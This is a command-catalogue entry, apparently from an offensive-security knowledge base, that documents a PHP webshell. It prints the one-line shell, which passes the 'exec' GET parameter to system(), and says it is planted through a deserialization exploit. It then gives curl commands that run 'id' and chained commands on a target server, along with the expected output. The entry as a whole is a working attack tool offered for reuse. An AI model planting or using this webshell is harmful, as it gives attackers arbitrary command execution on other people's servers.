---
id: cmd-001
data: '<?php system($_GET[''exec'']); ?> // fedef@secsignal.org'
tags:
  - rce
  - webshell
type: command
output: Output of the executed system command
executor: php
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:33.047Z'
verified: false
validated: true
submitted: true
---
# php-webshell-execute

## Command

This is PHP code embedded in a file, accessed via HTTP GET.

```php
<?php system($_GET['exec']); ?> // fedef@secsignal.org
```

## Description

PHP webshell that executes arbitrary system commands passed via the `exec` GET parameter using the `system()` function. Deployed to the filesystem via deserialization exploit; access via URL like `/tmp/pwned.php?exec=command` to run shell commands on the server.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `exec` | Arbitrary system command to execute (e.g., `id`, `ls /`) | Yes |

## Examples

### Basic Usage

Access via browser or curl:

```bash
curl "http://target/tmp/pwned.php?exec=id"
```

### Advanced Usage

Execute a multi-part command:

```bash
curl "http://target/tmp/pwned.php?exec=whoami && id"
```

## Expected Output

The stdout of the system command, e.g., `uid=33(www-data) gid=33(www-data) groups=33(www-data)` for `id`.

## Related

- [[procedures/Execute-Webshell-for-RCE]]
